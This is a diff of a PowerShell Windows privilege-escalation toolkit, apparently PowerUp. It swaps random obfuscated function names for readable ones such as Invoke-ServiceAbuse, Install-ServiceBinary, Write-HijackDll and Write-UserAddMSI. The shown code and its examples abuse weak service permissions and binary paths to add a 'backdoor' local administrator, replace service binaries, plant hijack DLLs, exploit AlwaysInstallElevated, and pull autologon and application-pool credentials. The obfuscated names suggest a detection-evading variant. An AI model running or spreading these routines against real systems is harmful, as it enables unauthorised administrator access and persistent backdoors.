@@ -39,7 +39,7 @@ Add-Type @"
   }
 "@
 
-function S0ISAFXU {
+function Get-ModifiableFile {
 <#
     .SYNOPSIS
 
@@ -47,7 +47,7 @@ function S0ISAFXU {
         
     .EXAMPLE
 
-        PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | S0ISAFXU
+        PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile
 
         Return the paths "C:\Temp\blah.bat" or "C:\Temp\config.ini" if they are
         modifable by the current user context.
@@ -105,7 +105,7 @@ function S0ISAFXU {
     }
 }
 
-function MZJK930W {
+function Test-ServiceDaclPermission {
 <#
     .SYNOPSIS
 
@@ -122,7 +122,7 @@ function MZJK930W {
   
     .EXAMPLE
 
-        PS C:\> MZJK930W -ServiceName VulnSVC -Dacl WPRPDC
+        PS C:\> Test-ServiceDaclPermission -ServiceName VulnSVC -Dacl WPRPDC
 
         Return $True if the current user has Stop (WP), Start (RP),
         and ChangeConf (DC) service permissions for 'VulnSVC' otherwise return $False.
@@ -215,7 +215,7 @@ function MZJK930W {
     }
 }
 
-function W05GXFFQ {
+function Invoke-ServiceStart {
 <#
     .SYNOPSIS
 
@@ -227,7 +227,7 @@ function W05GXFFQ {
 
     .EXAMPLE
 
-        PS C:\> W05GXFFQ -ServiceName VulnSVC
+        PS C:\> Invoke-ServiceStart -ServiceName VulnSVC
 
         Start the 'VulnSVC' service.
 #>
@@ -252,7 +252,7 @@ function W05GXFFQ {
         try {
             # enable the service if it was marked as disabled
             if ($TargetService.StartMode -eq "Disabled"){
-                $r = 0Q8B6BG4 -ServiceName "$($TargetService.Name)"
+                $r = Invoke-ServiceEnable -ServiceName "$($TargetService.Name)"
                 if (-not $r){ 
                     return $False 
                 }
@@ -273,7 +273,7 @@ function W05GXFFQ {
 }
 
 
-function J244P1BG {
+function Invoke-ServiceStop {
 <#
     .SYNOPSIS
 
@@ -285,7 +285,7 @@ function J244P1BG {
         
     .EXAMPLE
 
-        PS C:\> J244P1BG -ServiceName VulnSVC
+        PS C:\> Invoke-ServiceStop -ServiceName VulnSVC
 
         Stop the 'VulnSVC' service.
 #>
@@ -333,7 +333,7 @@ function J244P1BG {
 }
 
 
-function 0Q8B6BG4 {
+function Invoke-ServiceEnable {
 <#
     .SYNOPSIS
 
@@ -345,7 +345,7 @@ function 0Q8B6BG4 {
         
     .EXAMPLE
 
-        PS C:\> 0Q8B6BG4 -ServiceName VulnSVC
+        PS C:\> Invoke-ServiceEnable -ServiceName VulnSVC
 
         Enables the 'VulnSVC' service.
 #>
@@ -381,7 +381,7 @@ function 0Q8B6BG4 {
 }
 
 
-function PEVTX549 {
+function Invoke-ServiceDisable {
 <#
     .SYNOPSIS
 
@@ -393,7 +393,7 @@ function PEVTX549 {
     
     .EXAMPLE
 
-        PS C:\> PEVTX549 -ServiceName VulnSVC
+        PS C:\> Invoke-ServiceDisable -ServiceName VulnSVC
 
         Disables the 'VulnSVC' service.
 #>
@@ -435,7 +435,7 @@ function PEVTX549 {
 #
 ########################################################
 
-function F0S0N9ET {
+function Get-ServiceUnquoted {
 <#
     .SYNOPSIS
 
@@ -444,7 +444,7 @@ function F0S0N9ET {
         
     .EXAMPLE
 
-        PS C:\> $services = F0S0N9ET
+        PS C:\> $services = Get-ServiceUnquoted
         
         Get a set of potentially exploitable services.
 
@@ -462,14 +462,14 @@ function F0S0N9ET {
             $Out | Add-Member Noteproperty 'ServiceName' $Service.name
             $Out | Add-Member Noteproperty 'Path' $Service.pathname
             $Out | Add-Member Noteproperty 'StartName' $Service.startname
-            $Out | Add-Member Noteproperty 'AbuseFunction' "4Y4JO43Z -ServiceName '$($Service.name)' -Path <HijackPath>"
+            $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -ServiceName '$($Service.name)' -Path <HijackPath>"
             $Out
         }
     }
 }
 
 
-function RYHCCWAG {
+function Get-ServiceFilePermission {
 <#
     .SYNOPSIS
 
@@ -480,7 +480,7 @@ function RYHCCWAG {
         
     .EXAMPLE
 
-        PS C:\> RYHCCWAG
+        PS C:\> Get-ServiceFilePermission
 
         Get a set of potentially exploitable service binares/config files.
 #>
@@ -491,20 +491,20 @@ function RYHCCWAG {
         $ServicePath = $_.pathname
         $ServiceStartName = $_.startname
 
-        $ServicePath | S0ISAFXU | ForEach-Object {
+        $ServicePath | Get-ModifiableFile | ForEach-Object {
             $Out = New-Object PSObject 
             $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
             $Out | Add-Member Noteproperty 'Path' $ServicePath
             $Out | Add-Member Noteproperty 'ModifiableFile' $_
             $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
-            $Out | Add-Member Noteproperty 'AbuseFunction' "ZWV8GY75 -ServiceName '$ServiceName'"
+            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -ServiceName '$ServiceName'"
             $Out
         }
     }
 }
 
 
-function 3UPHZV5B {
+function Get-ServicePermission {
 <#
     .SYNOPSIS
 
@@ -514,7 +514,7 @@ function 3UPHZV5B {
     
     .EXAMPLE
 
-        PS C:\> 3UPHZV5B
+        PS C:\> Get-ServicePermission
 
         Get a set of potentially exploitable services.
 #>
@@ -545,7 +545,7 @@ function 3UPHZV5B {
                 $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                 $Out | Add-Member Noteproperty 'Path' $Service.pathname
                 $Out | Add-Member Noteproperty 'StartName' $Service.startname
-                $Out | Add-Member Noteproperty 'AbuseFunction' "N8FGKFSN -ServiceName '$($Service.name)'"
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
                 $Out
             }
         }
@@ -553,7 +553,7 @@ function 3UPHZV5B {
 }
 
 
-function LM4S33BG {
+function Get-ServiceDetail {
 <#
     .SYNOPSIS
 
@@ -565,7 +565,7 @@ function LM4S33BG {
 
     .EXAMPLE
 
-        PS C:\> LM4S33BG -ServiceName VulnSVC
+        PS C:\> Get-ServiceDetail -ServiceName VulnSVC
 
         Gets detailed information about the 'VulnSVC' service.
 #>
@@ -597,7 +597,7 @@ function LM4S33BG {
 #
 ########################################################
 
-function N8FGKFSN {
+function Invoke-ServiceAbuse {
 <#
     .SYNOPSIS
 
@@ -629,28 +629,28 @@ function N8FGKFSN {
 
     .EXAMPLE
 
-        PS C:\> N8FGKFSN -ServiceName VulnSVC
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC
 
         Abuses service 'VulnSVC' to add a localuser "john" with password 
         "Password123! to the  machine and local administrator group
 
     .EXAMPLE
 
-        PS C:\> N8FGKFSN -ServiceName VulnSVC -UserName "TESTLAB\john"
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john"
 
         Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
         local adminisrtators group.
 
     .EXAMPLE
 
-        PS C:\> N8FGKFSN -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
 
         Abuses service 'VulnSVC' to add a localuser "backdoor" with password 
         "password" to the  machine and local "Power Users" group
 
     .EXAMPLE
 
-        PS C:\> N8FGKFSN -ServiceName VulnSVC -Command "net ..."
+        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..."
 
         Abuses service 'VulnSVC' to execute a custom command.
 #>
@@ -697,7 +697,7 @@ function N8FGKFSN {
                 $RestoreDisabled = $False
                 if ($TargetService.StartMode -eq "Disabled") {
                     Write-Verbose "Service '$ServiceName' disabled, enabling..."
-                    if(-not $(0Q8B6BG4 -ServiceName $ServiceName)) {
+                    if(-not $(Invoke-ServiceEnable -ServiceName $ServiceName)) {
                         throw "Error in enabling disabled service."
                     }
                     $RestoreDisabled = $True
@@ -726,7 +726,7 @@ function N8FGKFSN {
                 }
 
                 foreach($Cmd in $Commands) {
-                    if(-not $(J244P1BG -ServiceName $TargetService.Name)) {
+                    if(-not $(Invoke-ServiceStop -ServiceName $TargetService.Name)) {
                         throw "Error in stopping service."
                     }
 
@@ -737,7 +737,7 @@ function N8FGKFSN {
                         throw "Access to service $($TargetService.Name) denied"
                     }
 
-                    $Null = W05GXFFQ -ServiceName $TargetService.Name
+                    $Null = Invoke-ServiceStart -ServiceName $TargetService.Name
                 }
  
                 # cleanup and restore the original binary path
@@ -751,14 +751,14 @@ function N8FGKFSN {
                 }
                 elseif($OriginalState -eq "Paused") {
                     Write-Verbose "Starting and then pausing service '$ServiceName'"
-                    $Null = W05GXFFQ -ServiceName  $TargetService.Name
+                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                     $Null = sc.exe pause $($TargetService.Name)
                 }
                 elseif($OriginalState -eq "Stopped") {
                     Write-Verbose "Leaving service '$ServiceName' in stopped state"
                 }
                 else {
-                    $Null = W05GXFFQ -ServiceName  $TargetService.Name
+                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                 }
             }
             catch {
@@ -780,7 +780,7 @@ function N8FGKFSN {
 }
 
 
-function 4Y4JO43Z {
+function Write-ServiceBinary {
 <#
     .SYNOPSIS
 
@@ -815,28 +815,28 @@ function 4Y4JO43Z {
 
     .EXAMPLE
 
-        PS C:\> 4Y4JO43Z -ServiceName VulnSVC
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC
 
         Writes the service binary for VulnSVC that adds a local administrator
         to the local directory.
 
     .EXAMPLE
 
-        PS C:\> 4Y4JO43Z -ServiceName VulnSVC -UserName "TESTLAB\john"
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
 
         Writes the service binary for VulnSVC that adds TESTLAB\john to the local
         administrators to the local directory.
 
     .EXAMPLE
 
-        PS C:\> 4Y4JO43Z -ServiceName VulnSVC -UserName backdoor -Password Password123!
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
 
         Writes the service binary for VulnSVC that adds a local administrator of
         name 'backdoor' with password 'Password123!' to the local directory.
 
     .EXAMPLE
 
-        PS C:\> 4Y4JO43Z -ServiceName VulnSVC -Command "net ..."
+        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -Command "net ..."
 
         Writes the service binary for VulnSVC that executes a local command
         to the local directory.
@@ -915,11 +915,11 @@ function 4Y4JO43Z {
 }
 
 
-function ZWV8GY75 {
+function Install-ServiceBinary {
 <#
     .SYNOPSIS
 
-        Users 4Y4JO43Z to write a C# service that creates a local UserName
+        Users Write-ServiceBinary to write a C# service that creates a local UserName
         and adds it to specified LocalGroup or executes a custom command.
         Domain users are only added to the specified LocalGroup.
 
@@ -945,21 +945,21 @@ function ZWV8GY75 {
 
     .EXAMPLE
 
-        PS C:\> ZWV8GY75 -ServiceName VulnSVC
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC
 
         Replaces the binary for VulnSVC with one that adds a local administrator
         to the local directory. Also backs up the original service binary.
 
     .EXAMPLE
 
-        PS C:\> ZWV8GY75 -ServiceName VulnSVC -UserName "TESTLAB\john"
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
 
         Replaces the binary for VulnSVC with one that adds TESTLAB\john to the local
         administrators to the local directory. Also backs up the original service binary.
 
     .EXAMPLE
 
-        PS C:\> ZWV8GY75 -ServiceName VulnSVC -UserName backdoor -Password Password123!
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
 
         Replaces the binary for VulnSVC with one that adds a local administrator of
         name 'backdoor' with password 'Password123!' to the local directory.
@@ -967,7 +967,7 @@ function ZWV8GY75 {
 
     .EXAMPLE
 
-        PS C:\> ZWV8GY75 -ServiceName VulnSVC -Command "net ..."
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."
 
         Replaces the binary for VulnSVC with one that executes a local command
         to the local directory. Also backs up the original service binary.
@@ -1019,8 +1019,8 @@ function ZWV8GY75 {
                     'LocalGroup' = $LocalGroup
                     'Command' = $Command
                 }
-                # splat the appropriate arguments to 4Y4JO43Z
-                $Result = 4Y4JO43Z @Arguments
+                # splat the appropriate arguments to Write-ServiceBinary
+                $Result = Write-ServiceBinary @Arguments
                 $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
                 $Result
             }
@@ -1047,7 +1047,7 @@ function ZWV8GY75 {
 }
 
 
-function RDPLO0MV {
+function Restore-ServiceBinary {
 <#
     .SYNOPSIS
 
@@ -1063,7 +1063,7 @@ function RDPLO0MV {
         
     .EXAMPLE
 
-        PS C:\> RDPLO0MV -ServiceName VulnSVC
+        PS C:\> Restore-ServiceBinary -ServiceName VulnSVC
 
         Restore the original binary for the service 'VulnSVC'
 #>
@@ -1250,7 +1250,7 @@ function Find-DLLHijack {
 }
 
 
-function EXF1S02X {
+function Find-PathHijack {
 <#
     .SYNOPSIS
 
@@ -1259,7 +1259,7 @@ function EXF1S02X {
 
     .EXAMPLE
 
-        PS C:\> EXF1S02X
+        PS C:\> Find-PathHijack
 
         Finds all %PATH% .DLL hijacking opportunities.
 
@@ -1295,7 +1295,7 @@ function EXF1S02X {
 
                 $Out = New-Object PSObject 
                 $Out | Add-Member Noteproperty 'HijackablePath' $Path
-                $Out | Add-Member Noteproperty 'AbuseFunction' "7U9DS2VW -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                 $Out
             }
             catch {}
@@ -1311,7 +1311,7 @@ function EXF1S02X {
 
                 $Out = New-Object PSObject 
                 $Out | Add-Member Noteproperty 'HijackablePath' $Path
-                $Out | Add-Member Noteproperty 'AbuseFunction' "7U9DS2VW -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                 $Out
             }
             catch {} 
@@ -1326,7 +1326,7 @@ function EXF1S02X {
 }
 
 
-function 7U9DS2VW {
+function Write-HijackDll {
 <#
     .SYNOPSIS
 
@@ -1484,7 +1484,7 @@ function 7U9DS2VW {
 #
 ########################################################
 
-function YEVX3CZZ {
+function Get-RegAlwaysInstallElevated {
 <#
     .SYNOPSIS
 
@@ -1494,7 +1494,7 @@ function YEVX3CZZ {
 
     .EXAMPLE
 
-        PS C:\> YEVX3CZZ
+        PS C:\> Get-RegAlwaysInstallElevated
 
         Checks if the AlwaysInstallElevated registry key is set.
 #>
@@ -1538,7 +1538,7 @@ function YEVX3CZZ {
 }
 
 
-function 2DEVZHHC {
+function Get-RegAutoLogon {
 <#
     .SYNOPSIS
 
@@ -1547,7 +1547,7 @@ function 2DEVZHHC {
 
     .EXAMPLE
 
-        PS C:\> 2DEVZHHC
+        PS C:\> Get-RegAutoLogon
         Finds any autologon credentials left in the registry.
 
     .LINK
@@ -1585,7 +1585,7 @@ function 2DEVZHHC {
 }   
 
 
-function TYBP9NHI {
+function Get-VulnAutoRun {
 <#
     .SYNOPSIS
 
@@ -1594,7 +1594,7 @@ function TYBP9NHI {
 
     .EXAMPLE
 
-        PS C:\> TYBP9NHI
+        PS C:\> Get-VulnAutoRun
 
         Return vulneable autorun binaries (or associated configs).
 #>
@@ -1622,7 +1622,7 @@ function TYBP9NHI {
 
             $Path = $($Keys.GetValue($Name))
 
-            $Path | S0ISAFXU | ForEach-Object {
+            $Path | Get-ModifiableFile | ForEach-Object {
                 $Out = New-Object PSObject 
                 $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                 $Out | Add-Member Noteproperty 'Path' $Path
@@ -1642,7 +1642,7 @@ function TYBP9NHI {
 #
 ########################################################
 
-function HUC7ZK09 {
+function Get-VulnSchTask {
 <#
     .SYNOPSIS
 
@@ -1651,7 +1651,7 @@ function HUC7ZK09 {
 
     .EXAMPLE
 
-        PS C:\> HUC7ZK09
+        PS C:\> Get-VulnSchTask
 
         Return vulnerable scheduled tasks.
 #>
@@ -1671,7 +1671,7 @@ function HUC7ZK09 {
         $TaskTrigger = $TaskXML.Task.Triggers.OuterXML
 
         # check schtask command
-        $TaskXML.Task.Actions.Exec.Command | S0ISAFXU | ForEach-Object {
+        $TaskXML.Task.Actions.Exec.Command | Get-ModifiableFile | ForEach-Object {
             $Out = New-Object PSObject 
             $Out | Add-Member Noteproperty 'TaskName' $TaskName
             $Out | Add-Member Noteproperty 'TaskFilePath' $_
@@ -1680,7 +1680,7 @@ function HUC7ZK09 {
         }
 
         # check schtask arguments
-        $TaskXML.Task.Actions.Exec.Arguments | S0ISAFXU | ForEach-Object {
+        $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiableFile | ForEach-Object {
             $Out = New-Object PSObject 
             $Out | Add-Member Noteproperty 'TaskName' $TaskName
             $Out | Add-Member Noteproperty 'TaskFilePath' $_
@@ -1693,7 +1693,7 @@ function HUC7ZK09 {
 }
 
 
-function BKHA0RNI {
+function Get-UnattendedInstallFile {
 <#
     .SYNOPSIS
 
@@ -1702,7 +1702,7 @@ function BKHA0RNI {
 
     .EXAMPLE
 
-        PS C:\> BKHA0RNI
+        PS C:\> Get-UnattendedInstallFile
 
         Finds any remaining unattended installation files.
 
@@ -1943,7 +1943,7 @@ function Get-Webconfig {
 }
 
 
-function 21CVAX8I {
+function Get-ApplicationHost {
  <#
     .SYNOPSIS
 
@@ -2005,7 +2005,7 @@ function 21CVAX8I {
     .NOTES
 
         Author: Scott Sutherland - 2014, NetSPI
-        Version: 21CVAX8I v1.0
+        Version: Get-ApplicationHost v1.0
         Comments: Should work on IIS 6 and Above
 #>
 
@@ -2088,16 +2088,16 @@ function 21CVAX8I {
 }
 
 
-function QNPL7CHX {
+function Write-UserAddMSI {
 <#
     .SYNOPSIS
 
         Writes out a precompiled MSI installer that prompts for a user/group addition. 
-        This function can be used to abuse YEVX3CZZ.
+        This function can be used to abuse Get-RegAlwaysInstallElevated.
 
     .EXAMPLE
 
-        PS C:\> QNPL7CHX
+        PS C:\> Write-UserAddMSI
 
         Writes the user add MSI to the local directory.
 #>
@@ -2123,7 +2123,7 @@ function QNPL7CHX {
 }
 
 
-function QNBETW5Q {
+function Invoke-AllChecks {
 <#
     .SYNOPSIS
 
@@ -2135,7 +2135,7 @@ function QNBETW5Q {
 
     .EXAMPLE
 
-        PS C:\> QNBETW5Q
+        PS C:\> Invoke-AllChecks
 
         Runs all escalation checks, output statuses for whatever's found.
 #>
@@ -2161,7 +2161,7 @@ function QNBETW5Q {
 
     # initial admin checks
 
-    "`n[*] Running QNBETW5Q"
+    "`n[*] Running Invoke-AllChecks"
 
     $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 
@@ -2189,21 +2189,21 @@ function QNBETW5Q {
     # Service checks
 
     "`n`n[*] Checking for unquoted service paths..."
-    $Results = F0S0N9ET
+    $Results = Get-ServiceUnquoted
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
     }
 
     "`n`n[*] Checking service executable and argument permissions..."
-    $Results = RYHCCWAG
+    $Results = Get-ServiceFilePermission
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Executable Permissions</H2>" | Out-File -Append $HtmlReportFile
     }
 
     "`n`n[*] Checking service permissions..."
-    $Results = 3UPHZV5B
+    $Results = Get-ServicePermission
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Permissions</H2>" | Out-File -Append $HtmlReportFile
@@ -2213,7 +2213,7 @@ function QNBETW5Q {
     # .dll hijacking
 
     "`n`n[*] Checking %PATH% for potentially hijackable .dll locations..."
-    $Results = EXF1S02X
+    $Results = Find-PathHijack
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
@@ -2223,10 +2223,10 @@ function QNBETW5Q {
     # registry checks
 
     "`n`n[*] Checking for AlwaysInstallElevated registry key..."
-    if (YEVX3CZZ) {
+    if (Get-RegAlwaysInstallElevated) {
         $Out = New-Object PSObject 
         $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
-        $Out | Add-Member Noteproperty 'AbuseFunction' "QNPL7CHX"
+        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
         $Results = $Out
 
         $Results | Format-List
@@ -2236,7 +2236,7 @@ function QNBETW5Q {
     }
 
     "`n`n[*] Checking for Autologon credentials in registry..."
-    $Results = 2DEVZHHC
+    $Results = Get-RegAutoLogon
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
@@ -2244,7 +2244,7 @@ function QNBETW5Q {
 
 
     "`n`n[*] Checking for vulnerable registry autoruns and configs..."
-    $Results = TYBP9NHI
+    $Results = Get-VulnAutoRun
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
@@ -2253,14 +2253,14 @@ function QNBETW5Q {
     # other checks
 
     "`n`n[*] Checking for vulnerable schtask files/configs..."
-    $Results = HUC7ZK09
+    $Results = Get-VulnSchTask
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Vulnerabl Schasks</H2>" | Out-File -Append $HtmlReportFile
     }
 
     "`n`n[*] Checking for unattended install files..."
-    $Results = BKHA0RNI
+    $Results = Get-UnattendedInstallFile
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
@@ -2274,7 +2274,7 @@ function QNBETW5Q {
     }
 
     "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
-    $Results = 21CVAX8I | Where-Object {$_}
+    $Results = Get-ApplicationHost | Where-Object {$_}
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
